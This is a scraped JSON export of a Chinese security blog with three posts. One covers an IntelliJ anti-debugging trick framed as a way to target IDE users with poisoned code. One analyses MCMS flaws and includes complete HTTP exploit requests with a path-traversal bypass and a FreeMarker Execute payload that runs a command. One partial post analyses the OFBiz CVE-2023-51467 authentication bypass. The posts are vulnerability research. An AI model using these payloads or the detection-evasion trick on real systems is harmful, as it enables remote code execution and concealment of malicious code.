endend","categories":[{"name":"Python","slug":"Python","permalink":"https://y4tacker.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://y4tacker.github.io/tags/Python/"},{"name":"Gitlab","slug":"Gitlab","permalink":"https://y4tacker.github.io/tags/Gitlab/"}]},{"title":"如何判断在IDEA中程序正在运行或正在Debug","slug":"year/2024/1/如何判断在IDEA中程序正在运行或正在Debug","date":"2024-01-04T15:20:39.000Z","updated":"2024-01-04T15:40:58.000Z","comments":true,"path":"2024/01/04/year/2024/1/如何判断在IDEA中程序正在运行或正在Debug/","link":"","permalink":"https://y4tacker.github.io/2024/01/04/year/2024/1/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E5%9C%A8IDEA%E4%B8%AD%E7%A8%8B%E5%BA%8F%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E6%88%96%E6%AD%A3%E5%9C%A8Debug/","excerpt":"","text":"如何判断在IDEA中程序正在运行或正在Debug给大家分享一个有趣又无用的东西，如何判断在IDEA中程序正在运行或正在Debug 在这个之前我们首先需要了解一个类ManagementFactory ，它是 Java 标准库中的一个类，它提供了访问运行时系统管理接口的工厂方法。通过 ManagementFactory 类，可以获取包括操作系统、内存、线程、类加载器等在内的多种系统管理信息。 一些常用的用途包括： 获取运行时信息：可以通过 ManagementFactory.getRuntimeMXBean() 方法获取与 Java 虚拟机的运行时信息相关的 bean，包括虚拟机的名称、虚拟机的启动时间、虚拟机的系统属性等。 获取操作系统信息：可以使用 ManagementFactory.getOperatingSystemMXBean() 方法获取与操作系统相关的 bean，包括 CPU 数量、系统负载等信息。 获取内存信息：可以使用 ManagementFactory.getMemoryMXBean() 方法获取与内存相关的 bean，包括堆内存使用情况、非堆内存使用情况等。 获取线程信息：可以使用 ManagementFactory.getThreadMXBean() 方法获取与线程相关的 bean，包括线程数量、线程状态等。 因此我们通过 ManagementFactory.getRuntimeMXBean().getInputArguments() 即可获得所有 JVM 参数 通过下面这样简单的代码我们可以 1234List&lt;String&gt; inputArguments = ManagementFactory.getRuntimeMXBean().getInputArguments(); for (String arg : inputArguments) &#123; System.out.println(arg);&#125; 以我的电脑为例，普通运行时 12-javaagent:/Applications/myapp/IntelliJ IDEA.app/Contents/lib/idea_rt.jar=51347:/Applications/myapp/IntelliJ IDEA.app/Contents/bin-Dfile.encoding=UTF-8 debug时 123-agentlib:jdwp=transport=dt_socket,address=127.0.0.1:51362,suspend=y,server=n-javaagent:/Users/y4tacker/Library/Caches/JetBrains/IntelliJIdea2021.3/captureAgent/debugger-agent.jar-Dfile.encoding=UTF-8 我们不难发现在运行时与debug时，注入了不同的Agent对象，因此我们便可以利用这个差异性去判断程序是在运行还是在debug，当然为了减小检测的动静如果我们不使用ManagementFactory怎么办？ 解决方法也很简单，既然注入了不同的Agent那么就必然在加载时就有着不同的类 因此通过下面这样简单的几行代码，就能解决这个问题啦 12345678try &#123; Thread.currentThread().getContextClassLoader().loadClass(&quot;com.intellij.rt.debugger.agent.CaptureAgent&quot;); System.out.println(&quot;我在debug呢&quot;);&#125;catch (java.lang.ClassNotFoundException e)&#123; Thread.currentThread().getContextClassLoader().loadClass(&quot;com.intellij.rt.ant.execution.AntMain2&quot;); System.out.println(&quot;我没在debug呢&quot;);&#125; 下面来看看效果，直接运行 debug运行 简单但是有趣，接下来我们便可以结合之前提到的混淆方案，继续给IDEA做更定向的投毒，同时我们也可以通过这样一串简单的代码去尝试阻止别人在IDEA中运行或者调试我们的代码","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Trick","slug":"Trick","permalink":"https://y4tacker.github.io/tags/Trick/"}]},{"title":"又又又是一个属性覆盖带来的漏洞","slug":"year/2023/12/又又又是一个属性覆盖带来的漏洞","date":"2023-12-28T13:26:01.000Z","updated":"2024-08-04T09:01:49.890Z","comments":true,"path":"2023/12/28/year/2023/12/又又又是一个属性覆盖带来的漏洞/","link":"","permalink":"https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"又又又是一个属性覆盖带来的漏洞想到最近出了好几个与属性覆盖有关的漏洞，突然想到有一个国产系统也曾经出过这类问题，比较有趣这里简单分享一下，希望把一些东西串起来分享方便学到一些东西 前后端框架信息梳理首先简单从官网可以看出所使用的框架信息以及技术选型 https://gitee.com/mingSoft/MCMS?_from=gitee_search 我们主要关注几个点一个是shiro，一个是freemarker，还有就是具体的一些未鉴权的功能点，同时支持两种部署方式jar/war 关于路由的说明，在启动类当中，指出了扫描的包名前缀为net.mingsoft 12345678@SpringBootApplication(scanBasePackages = &#123;&quot;net.mingsoft&quot;&#125;)@MapperScan(basePackages=&#123;&quot;**.dao&quot;,&quot;com.baomidou.**.mapper&quot;&#125;)@ServletComponentScan(basePackages = &#123;&quot;net.mingsoft&quot;&#125;)public class MSApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(MSApplication.class, args); &#125;&#125; 因此与路由相关函数只会出现在三个地方 源目录下 ms-basic依赖包下 ms-mdiy依赖包下 这个系统曾出现过很多漏洞，各类后台文件上传利用，注入、任意文件删除等等，但其实都比较鸡肋不适合学习 Shiro反序列化(版本&lt;=5.2.8 )在开始前先简单我们知道shiro的版本高低只是加密方式的改变，实际上反序列化漏洞依然存在，如果系统使用了默认的key那也是存在潜在风险的，而恰好在MCMS&lt;=5.2.8版本下都使用了默认的key，使用这个key生成payload，直接打CB链即可 接下来我们重点看另一个漏洞 前台模板SSTIRCE利用史接下来我们看另一个漏洞，和模板相关的漏洞 因为这里的模板渲染使用了freemarker，我们便有两个思路： 版本是否在漏洞版本 写法是否安全 在MCMS中关于模板的渲染处理，是通过封装了一个工具类做的处理，在依赖包ms-mdiy中的net.mingsoft.mdiy.util.ParserUtil#rendering做处理 MCMS是在5.1版本开始使用freemarker做模板渲染，并且版本一直没有改变过，传家宝&quot;2.3.31&quot; 对于freemarker的模板，通常是通过api与new进行的利用，当然也有利用限制 对于内置函数api api_builtin_enabled为true时才可使用api函数，而该配置在2.3.22版本之后默认为false 对于内置函数new 从 2.3.17版本以后，官方版本提供了三种TemplateClassResolver对类进行解析： 1、UNRESTRICTED_RESOLVER：可以通过 ClassUtil.forName(className) 获取任何类。 2、SAFER_RESOLVER：不能加载 freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor这三个类。 3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。 可通过freemarker.core.Configurable#setNewBuiltinClassResolver方法设置TemplateClassResolver，从而限制通过new()函数对freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor这三个类的解析 尽管MCMS的漏洞版本比较高，但是他在5.8版本以下并未对内置函数new做严格限制，具体我们可以看看net.mingsoft.mdiy.util.ParserUtil#rendering 1234567891011public static String rendering(Map root, String content) throws IOException, TemplateException &#123; Configuration cfg = new Configuration(Configuration.VERSION_2_3_0); StringTemplateLoader stringLoader = new StringTemplateLoader(); stringLoader.putTemplate(&quot;template&quot;, content); cfg.setNumberFormat(&quot;#&quot;); cfg.setTemplateLoader(stringLoader); Template template = cfg.getTemplate(&quot;template&quot;, &quot;utf-8&quot;); StringWriter writer = new StringWriter(); template.process(root, writer); return writer.toString();&#125; 虽然在freemarker版本在较安全的版本，但并未配置new-builtin-class-resolver，因此接下来我们只需要找到调用的点即可 在高版本后5.2.9，开发者终于意识到这个问题，设置了cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER); 回到正题，这里我们先从较低的版本说起，以5.2.5来做例子 V&lt;=5.2.5首先是一个能任意控制模板渲染的函数 这个路由非常好找，就在源码路径下为数不多不是CRUD功能的类中net.mingsoft.cms.action.web.MCmsAction#search 123456789101112131415161718192021222324252627/** * 实现前端页面的文章搜索 * * @param request 搜索id * @param response */ @RequestMapping(value = &quot;search&quot;,method = &#123;RequestMethod.GET, RequestMethod.POST&#125;) @ResponseBody public String search(HttpServletRequest request, HttpServletResponse response) &#123; String search = BasicUtil.getString(&quot;tmpl&quot;, &quot;search.htm&quot;); ............ //解析后的内容 String content = &quot;&quot;; try &#123; //根据模板路径，参数生成 content = ParserUtil.rendering(search, params); &#125; catch (TemplateNotFoundException e) &#123; e.printStackTrace(); &#125; catch (MalformedTemplateNameException e) &#123; e.printStackTrace(); &#125; catch (ParseException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return content; &#125; 可以这里通过tmpl参数能实现渲染文件的完全控制，但是 在ParserUtil.getPageSize(search, 20)当中我们会发现，其读取文件过程中使用了hutool的FileUtil.file,在这个第三方工具类使用了checkSlip防止目录穿越，因此非常可惜我们现在能渲染任意路径下的文件了 123456789101112131415161718public static File checkSlip(File parentFile, File file) throws IllegalArgumentException &#123; if (null != parentFile &amp;&amp; null != file) &#123; String parentCanonicalPath; String canonicalPath; try &#123; parentCanonicalPath = parentFile.getCanonicalPath(); canonicalPath = file.getCanonicalPath(); &#125; catch (IOException var5) &#123; throw new IORuntimeException(var5); &#125; if (!canonicalPath.startsWith(parentCanonicalPath)) &#123; throw new IllegalArgumentException(&quot;New file is outside of the parent dir: &quot; + file.getName()); &#125; &#125; return file;&#125; 那要想实现，那必须找到一个能够控制任意路径上传，或者能够配合目录穿越跳转的上传点，这个系统中正好就有，在net.mingsoft.basic.action.web.EditorAction#editor中，参数传入后交给了MsUeditorActionEnter类继续处理 12345678910111213141516171819202122232425262728293031323334353637public String editor(HttpServletRequest request, HttpServletResponse response, String jsonConfig) &#123; String rootPath = BasicUtil.getRealPath(&quot;&quot;); File saveFloder = new File(this.uploadFloderPath); if (saveFloder.isAbsolute()) &#123; rootPath = saveFloder.getPath(); jsonConfig = jsonConfig.replace(&quot;&#123;ms.upload&#125;&quot;, &quot;&quot;); &#125; else &#123; jsonConfig = jsonConfig.replace(&quot;&#123;ms.upload&#125;&quot;, &quot;/&quot; + this.uploadFloderPath); &#125; String json = (new MsUeditorActionEnter(request, rootPath, jsonConfig, BasicUtil.getRealPath(&quot;&quot;))).exec(); if (saveFloder.isAbsolute()) &#123; Map data = (Map)JSON.parse(json); data.put(&quot;url&quot;, this.uploadMapping.replace(&quot;/**&quot;, &quot;&quot;) + data.get(&quot;url&quot;)); return JSON.toJSONString(data); &#125; else &#123; return json; &#125;&#125;public MsUeditorActionEnter(HttpServletRequest request, String rootPath, String jsonConfig, String configPath) &#123; super(request, rootPath); if (jsonConfig != null &amp;&amp; !jsonConfig.trim().equals(&quot;&quot;) &amp;&amp; jsonConfig.length() &gt;= 0) &#123; this.setConfigManager(ConfigManager.getInstance(configPath, request.getContextPath(), request.getRequestURI())); ConfigManager config = this.getConfigManager(); setValue(config, &quot;rootPath&quot;, rootPath); JSONObject _jsonConfig = new JSONObject(jsonConfig); JSONObject jsonObject = config.getAllConfig(); Iterator iterator = _jsonConfig.keys(); while(iterator.hasNext()) &#123; String key = (String)iterator.next(); jsonObject.put(key, _jsonConfig.get(key)); &#125; &#125;&#125; 在初始化过程中，先初始化了父类，这里可以看到，actionType受我们传入的参数控制，这个参数决定了方法的调用 1234567public ActionEnter(HttpServletRequest request, String rootPath) &#123; this.request = request; this.rootPath = rootPath; this.actionType = request.getParameter(&quot;action&quot;); this.contextPath = request.getContextPath(); this.configManager = ConfigManager.getInstance(this.rootPath, this.contextPath, request.getRequestURI());&#125; 接下来回到MsUeditorActionEnter构造函数处理过程，紧接着调用了this.getConfigManager()初始化一些上传配置，而这个配置来源于文件static/plugins/ueditor/1.4.3.3/jsp/config.json，这个配置文件对上传做了限制，包括保存文件路径模板、大小、允许的后缀等，感兴趣的可以自己看看这个初始化过程，因为不太关键这里就不多叙述 在这里可以看到存在一个参数覆盖的问题(jsonConfig来源于web参数)，可以由自定义的输入覆盖默认配置，具体覆盖什么配置待会儿会说 1234567891011121314151617public MsUeditorActionEnter(HttpServletRequest request, String rootPath, String jsonConfig, String configPath) &#123; super(request, rootPath); if (jsonConfig != null &amp;&amp; !jsonConfig.trim().equals(&quot;&quot;) &amp;&amp; jsonConfig.length() &gt;= 0) &#123; this.setConfigManager(ConfigManager.getInstance(configPath, request.getContextPath(), request.getRequestURI())); ConfigManager config = this.getConfigManager(); setValue(config, &quot;rootPath&quot;, rootPath); JSONObject _jsonConfig = new JSONObject(jsonConfig); JSONObject jsonObject = config.getAllConfig(); Iterator iterator = _jsonConfig.keys(); while(iterator.hasNext()) &#123; String key = (String)iterator.next(); jsonObject.put(key, _jsonConfig.get(key)); &#125; &#125;&#125; 接下来初始化后调用exec方法，这里callback是否传入对我们不是很重要，继续看invoke方法 根据我们之前传入的actionType决定走入哪个分支 可以看到一共有8种类型，对应了不同的漏洞点，因为我们只关心RCE，所以这里就以上传为例，选择uploadfile 12345678this.put(&quot;config&quot;, 0);this.put(&quot;uploadimage&quot;, 1);this.put(&quot;uploadscrawl&quot;, 2);this.put(&quot;uploadvideo&quot;, 3);this.put(&quot;uploadfile&quot;, 4);this.put(&quot;catchimage&quot;, 5);this.put(&quot;listfile&quot;, 6);this.put(&quot;listimage&quot;, 7); 在之后调用(new Uploader(this.request, conf)).doExec()做处理，这里的参数走向我们同样不在乎随便选择一个即可 1234567891011public final State doExec() &#123; String filedName = (String)this.conf.get(&quot;fieldName&quot;); State state = null; if (&quot;true&quot;.equals(this.conf.get(&quot;isBase64&quot;))) &#123; state = Base64Uploader.save(this.request.getParameter(filedName), this.conf); &#125; else &#123; state = BinaryUploader.save(this.request, this.conf); &#125; return state;&#125; 省略其中的不关键的部分，这里我们只需要关注最终保存路径的生成即可 12345678910111213141516171819202122...String savePath = (String)conf.get(&quot;savePath&quot;);String originFileName = fileStream.getName();String suffix = FileType.getSuffixByFilename(originFileName);originFileName = originFileName.substring(0, originFileName.length() - suffix.length());savePath = savePath + suffix;long maxSize = (Long)conf.get(&quot;maxSize&quot;);if (!validType(suffix, (String[])((String[])conf.get(&quot;allowFiles&quot;)))) &#123; return new BaseState(false, 8);&#125; else &#123; savePath = PathFormat.parse(savePath, originFileName); String physicalPath = (String)conf.get(&quot;rootPath&quot;) + savePath; InputStream is = fileStream.openStream(); State storageState = StorageManager.saveFileByInputStream(is, physicalPath, maxSize); is.close(); if (storageState.isSuccess()) &#123; storageState.putInfo(&quot;url&quot;, PathFormat.format(savePath)); storageState.putInfo(&quot;type&quot;, suffix); storageState.putInfo(&quot;original&quot;, originFileName + suffix); &#125;&#125;... 从配置获取保存的路径 从Multipart解析文件后缀拼接 使用PathFormat.parse处理替换模板标签内容 与根路径拼接并写入文件 在com.baidu.ueditor.PathFormat#parse的处理过程当中会对filename中字符做替换，导致/字符丢失因此不能从filename控制路径的穿越 1filename = filename.replace(&quot;$&quot;, &quot;\\\\$&quot;).replaceAll(&quot;[\\\\/:*?\\&quot;&lt;&gt;|]&quot;, &quot;&quot;); 因此我们只能通过控制savePath实现完整的路径控制(还记得么，上面一开始提到过可以做参数覆盖)，对于我们的uploadfile的action，对应的savepath属性为filePathFormat，因此构造，当然也可以覆盖其他属性参数这里不重复 12345678910111213141516Ps:&#123;&#123;url()&#125;是yakit的url编码的标签POST /static/plugins/ueditor/1.4.3.3/jsp/editor.do?jsonConfig=&#123;&#123;url(&#123;filePathFormat:&#x27;/template/1/default/2&#x27;&#125;)&#125;&#125;&amp;action=uploadfile HTTP/1.1Host: 127.0.0.1:8079Accept: */*Accept-Encoding: gzip, deflateConnection: closeContent-Length: 362Content-Type: multipart/form-data; boundary=------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXAUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36X_Requested_With: UTF-8--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXAContent-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;1.txt&quot;&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;open -na Calculator&quot;)&#125;--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA-- V&lt;=5.2.8接下来我们看看开发是如何修复这个问题的，这里我的环境是5.2.8，这一次开发意识到了问题所在，做了两个步骤的修复 rootPath由程序控制在必须为upload目录下 对每一个路径配置做了一次路径归一化 123456789101112131415161718192021public String editor(HttpServletRequest request, HttpServletResponse response, String jsonConfig) &#123; String uploadFloderPath = MSProperties.upload.path; String rootPath = BasicUtil.getRealPath(uploadFloderPath); jsonConfig = jsonConfig.replace(&quot;&#123;ms.upload&#125;&quot;, &quot;/&quot; + uploadFloderPath); Map&lt;String, Object&gt; map = (Map)JSONObject.parse(jsonConfig); String imagePathFormat = (String)map.get(&quot;imagePathFormat&quot;); imagePathFormat = FileUtil.normalize(imagePathFormat); String filePathFormat = (String)map.get(&quot;filePathFormat&quot;); filePathFormat = FileUtil.normalize(filePathFormat); String videoPathFormat = (String)map.get(&quot;videoPathFormat&quot;); videoPathFormat = FileUtil.normalize(videoPathFormat); map.put(&quot;imagePathFormat&quot;, imagePathFormat); map.put(&quot;filePathFormat&quot;, filePathFormat); map.put(&quot;videoPathFormat&quot;, videoPathFormat); jsonConfig = JSONObject.toJSONString(map); MsUeditorActionEnter actionEnter = new MsUeditorActionEnter(request, rootPath, jsonConfig, BasicUtil.getRealPath(&quot;&quot;)); String json = actionEnter.exec(); Map jsonMap = (Map)JSON.parseObject(json, Map.class); jsonMap.put(&quot;url&quot;, &quot;/&quot;.concat(uploadFloderPath).concat(jsonMap.get(&quot;url&quot;) + &quot;&quot;)); return JSONObject.toJSONString(jsonMap);&#125; 那是不是就没办法了呢？请独立思考三分钟 之前提到了在PathFormat.parse当中，有对最终路径当中的模板做替换(当然这里和老版本的逻辑不一样，简化了很多，分析时以当前版本为准，有兴趣可以看看老版)，可以看到会取{xxx}中的内容，之后调用getString做替换 1234567891011121314151617181920public static String parse(String input, String filename) &#123; Pattern pattern = Pattern.compile(&quot;\\\\&#123;([^\\\\&#125;]+)\\\\&#125;&quot;, 2); Matcher matcher = pattern.matcher(input); String matchStr = null; currentDate = new Date(); StringBuffer sb = new StringBuffer(); while(matcher.find()) &#123; matchStr = matcher.group(1); if (matchStr.indexOf(&quot;filename&quot;) != -1) &#123; filename = filename.replace(&quot;$&quot;, &quot;\\\\$&quot;).replaceAll(&quot;[\\\\/:*?\\&quot;&lt;&gt;|]&quot;, &quot;&quot;); matcher.appendReplacement(sb, filename); &#125; else &#123; matcher.appendReplacement(sb, getString(matchStr)); &#125; &#125; matcher.appendTail(sb); return sb.toString();&#125; 可以看到如果字符不在当前的case当中会直接返回 12345678910111213141516171819202122private static String getString(String pattern) &#123; pattern = pattern.toLowerCase(); if (pattern.indexOf(&quot;time&quot;) != -1) &#123; return getTimestamp(); &#125; else if (pattern.indexOf(&quot;yyyy&quot;) != -1) &#123; return getFullYear(); &#125; else if (pattern.indexOf(&quot;yy&quot;) != -1) &#123; return getYear(); &#125; else if (pattern.indexOf(&quot;mm&quot;) != -1) &#123; return getMonth(); &#125; else if (pattern.indexOf(&quot;dd&quot;) != -1) &#123; return getDay(); &#125; else if (pattern.indexOf(&quot;hh&quot;) != -1) &#123; return getHour(); &#125; else if (pattern.indexOf(&quot;ii&quot;) != -1) &#123; return getMinute(); &#125; else if (pattern.indexOf(&quot;ss&quot;) != -1) &#123; return getSecond(); &#125; else &#123; return pattern.indexOf(&quot;rand&quot;) != -1 ? getRandom(pattern) : pattern; &#125;&#125; 有了这个思路我们便可以构造如下payload绕过校验 12345678910111213141516Ps:&#123;&#123;url()&#125;是yakit的url编码的标签POST /static/plugins/ueditor/1.4.3.3/jsp/editor.do?jsonConfig=&#123;filePathFormat:&#x27;/&#123;.&#125;./template/1/default/2&#x27;&#125;&amp;action=uploadfile HTTP/1.1Host: 127.0.0.1:8080Accept: */*Accept-Encoding: gzip, deflateConnection: closeContent-Length: 362Content-Type: multipart/form-data; boundary=------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXAUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36X_Requested_With: UTF-8--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXAContent-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;1.txt&quot;&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;open -na Calculator&quot;)&#125;--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA-- V&lt;=5.3.5(目前最新版)首先来看最新版做了哪些变动 在最外层做了jsonConfig判断内容(似乎也没修复什么) 1234567891011121314151617181920212223242526272829303132public String editor(HttpServletRequest request, HttpServletResponse response, String jsonConfig) &#123; String uploadFolderPath = MSProperties.upload.path; boolean enableWeb = MSProperties.upload.enableWeb; if (!enableWeb) &#123; HashMap&lt;String, String&gt; map = new HashMap(); map.put(&quot;state&quot;, &quot;front end upload is not enabled&quot;); return JSONUtil.toJsonStr(map); &#125; else &#123; String rootPath = BasicUtil.getRealPath(uploadFolderPath); jsonConfig = jsonConfig.replace(&quot;&#123;ms.upload&#125;&quot;, &quot;/&quot; + uploadFolderPath); Map&lt;String, Object&gt; map = (Map)JSONUtil.toBean(jsonConfig, Map.class); String imagePathFormat = (String)map.get(&quot;imagePathFormat&quot;); imagePathFormat = FileUtil.normalize(imagePathFormat); String filePathFormat = (String)map.get(&quot;filePathFormat&quot;); filePathFormat = FileUtil.normalize(filePathFormat); String videoPathFormat = (String)map.get(&quot;videoPathFormat&quot;); videoPathFormat = FileUtil.normalize(videoPathFormat); map.put(&quot;imagePathFormat&quot;, imagePathFormat); map.put(&quot;filePathFormat&quot;, filePathFormat); map.put(&quot;videoPathFormat&quot;, videoPathFormat); jsonConfig = JSONUtil.toJsonStr(map); if (jsonConfig == null || !jsonConfig.contains(&quot;../&quot;) &amp;&amp; !jsonConfig.contains(&quot;..\\\\&quot;)) &#123; MsUeditorActionEnter actionEnter = new MsUeditorActionEnter(request, rootPath, jsonConfig, BasicUtil.getRealPath(&quot;&quot;)); String json = actionEnter.exec(); Map jsonMap = (Map)JSONUtil.toBean(json, Map.class); jsonMap.put(&quot;url&quot;, &quot;/&quot;.concat(uploadFolderPath).concat(jsonMap.get(&quot;url&quot;) + &quot;&quot;)); return JSONUtil.toJsonStr(jsonMap); &#125; else &#123; throw new BusinessException(BundleUtil.getString(&quot;net.mingsoft.base.resources.resources&quot;, &quot;err.error&quot;, new String[]&#123;BundleUtil.getString(&quot;net.mingsoft.basic.resources.resources&quot;, &quot;file.path&quot;, new String[0])&#125;)); &#125; &#125;&#125; 禁止通过属性覆盖修改允许的后缀(我估计开发以为模板引擎必须要htm后缀才行了，忘记他自己写的函数是可以随意指定后缀了2333)，以及文件读取相关属性 12345678910111213141516171819202122232425public MsUeditorActionEnter(HttpServletRequest request, String rootPath, String jsonConfig, String configPath) &#123; super(request, rootPath); if (jsonConfig != null &amp;&amp; !jsonConfig.trim().equals(&quot;&quot;) &amp;&amp; jsonConfig.length() &gt;= 0) &#123; this.setConfigManager(ConfigManager.getInstance(configPath, request.getContextPath(), request.getRequestURI())); ConfigManager config = this.getConfigManager(); setValue(config, &quot;rootPath&quot;, rootPath); JSONObject _jsonConfig = new JSONObject(jsonConfig); _jsonConfig.remove(&quot;fileManagerAllowFiles&quot;); _jsonConfig.remove(&quot;imageManagerAllowFiles&quot;); _jsonConfig.remove(&quot;catcherAllowFiles&quot;); _jsonConfig.remove(&quot;imageAllowFiles&quot;); _jsonConfig.remove(&quot;fileAllowFiles&quot;); _jsonConfig.remove(&quot;videoAllowFiles&quot;); _jsonConfig.remove(&quot;imageManagerListPath&quot;); _jsonConfig.remove(&quot;fileManagerListPath&quot;); JSONObject jsonObject = config.getAllConfig(); Iterator iterator = _jsonConfig.keys(); while(iterator.hasNext()) &#123; String key = (String)iterator.next(); jsonObject.put(key, _jsonConfig.get(key)); &#125; &#125; &#125; 引擎解析测 设置禁止加载任意类 1cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER) 但这样并不能完全修复问题，可以参考辅助学习(https://www.cnblogs.com/escape-w/p/17326592.html)，虽然这个项目不存在这些问题就是了 那么如何才能rce呢？提示一下，我们知道此时文件上传其实仍然能够跨目录写的，那么只能从白名单中受限的后缀入手，发挥你的想象，这里就不直接给出答案了","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"代码审计","slug":"代码审计","permalink":"https://y4tacker.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Apache OFBiz未授权命令执行浅析(CVE-2023-51467)","slug":"year/2023/12/Apache-OFBiz未授权命令执行浅析-CVE-2023-51467","date":"2023-12-27T14:11:39.000Z","updated":"2024-08-04T09:01:49.768Z","comments":true,"path":"2023/12/27/year/2023/12/Apache-OFBiz未授权命令执行浅析-CVE-2023-51467/","link":"","permalink":"https://y4tacker.github.io/2023/12/27/year/2023/12/Apache-OFBiz%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90-CVE-2023-51467/","excerpt":"","text":"Apache OFBiz未授权命令执行浅析(CVE-2023-51467)未修复的权限绕过还是之前那个遗留的问题，首先是权限绕过，首先还是做一个简单的回顾关于登录的校验在org.apache.ofbiz.webapp.control.LoginWorker#checkLogin做处理来判断用户是否登录，可以看到这里的判断逻辑非常简单，跳过前两个判断，在后面只需要login返回的不是error，则为认证成功 再来看看login的判断，在这里如果unPwErrMsglist不为null则可以直接返回requirePasswordChange 因此知道这个其实你就可以去后台点一点就知道哪里能RCE了，但是我比较好奇OFBiz的路由处理，为什么最后能调用到ProgramExport.groovy 路由处理以及解惑在web.xml当中可以看到仅有一个Servlet处理，继续跟入org.apache.ofbiz.webapp.control.ControlServlet 以doGET为例，忽略一些无关的逻辑，最终都是通过handler.doRequest做请求的处理 在这里我们先看看handler的获取处理，首先在servlet的初始化过程就进行了初始化操作 123456789101112@Overridepublic void init() throws ServletException &#123; ServletContext ctx = getServletContext(); if (Debug.infoOn()) &#123; String path = ctx.getContextPath(); String webappName = path.isEmpty() ? path : path.substring(1); Debug.logInfo(&quot;Loading webapp [&quot; + webappName + &quot;], located at &quot; + ctx.getRealPath(&quot;/&quot;), module); &#125; // Initialize the request handler. RequestHandler.getRequestHandler(ctx);&#125; 可以看到代码虽然不少，但其实就是从/WEB-INF/controller.xml下获取了路由的配置，并根据配置文件初始化了两个工厂类ViewFactory/EventFactory 123456789101112131415161718192021222324252627282930313233343536373839404142public static RequestHandler getRequestHandler(ServletContext servletContext) &#123; RequestHandler rh = (RequestHandler) servletContext.getAttribute(&quot;_REQUEST_HANDLER_&quot;); if (rh == null) &#123; rh = new RequestHandler(servletContext); servletContext.setAttribute(&quot;_REQUEST_HANDLER_&quot;, rh); &#125; return rh;&#125;private RequestHandler(ServletContext context) &#123; // init the ControllerConfig, but don&#x27;t save it anywhere, just load it into the cache this.controllerConfigURL = ConfigXMLReader.getControllerConfigURL(context); try &#123; ConfigXMLReader.getControllerConfig(this.controllerConfigURL); &#125; catch (WebAppConfigurationException e) &#123; // FIXME: controller.xml errors should throw an exception. Debug.logError(e, &quot;Exception thrown while parsing controller.xml file: &quot;, module); &#125; this.viewFactory = new ViewFactory(context, this.controllerConfigURL); this.eventFactory = new EventFactory(context, this.controllerConfigURL); this.trackServerHit = !&quot;false&quot;.equalsIgnoreCase(context.getInitParameter(&quot;track-serverhit&quot;)); this.trackVisit = !&quot;false&quot;.equalsIgnoreCase(context.getInitParameter(&quot;track-visit&quot;)); hostHeadersAllowed = UtilMisc.getHostHeadersAllowed();&#125;public static ControllerConfig getControllerConfig(WebappInfo webAppInfo) throws WebAppConfigurationException, MalformedURLException &#123; Assert.notNull(&quot;webAppInfo&quot;, webAppInfo); String filePath = webAppInfo.getLocation().concat(controllerXmlFileName); File configFile = new File(filePath); return getControllerConfig(configFile.toURI().toURL());&#125;public static ControllerConfig getControllerConfig(URL url) throws WebAppConfigurationException &#123; ControllerConfig controllerConfig = controllerCache.get(url); if (controllerConfig == null) &#123; controllerConfig = controllerCache.putIfAbsentAndGet(url, new ControllerConfig(url)); &#125; return controllerConfig;&#125; 接下来我们继续看org.apache.ofbiz.webapp.control.RequestHandler#doRequest,首先根据请求路径获取对应处理的RequestMap 接着首先是一些预处理，感兴趣的可以自己看看 继续往下，之后在正式处理前会走到我们熟悉的登录校验由于第一部分已经简单做了分析，这里就不再重复 之后根据返回结果选择对应的response，上面也提到过requestMap与uri有关，同样response这部分与uri以及type有关 12345&lt;request-map uri=&quot;ProgramExport&quot;&gt; &lt;security https=&quot;true&quot; auth=&quot;true&quot;/&gt; &lt;response name=&quot;success&quot; type=&quot;view&quot; value=&quot;ProgramExport&quot;/&gt; &lt;response name=&quot;error&quot; type=&quot;view&quot; value=&quot;ProgramExport&quot;/&gt;&lt;/request-map&gt; 接下来可以看到这里根据nextRequestResponse.type的种类执行，和我们请求的路径在xml中对应的配置有关，在这里由于我们是view因此走入else执行后置处理器 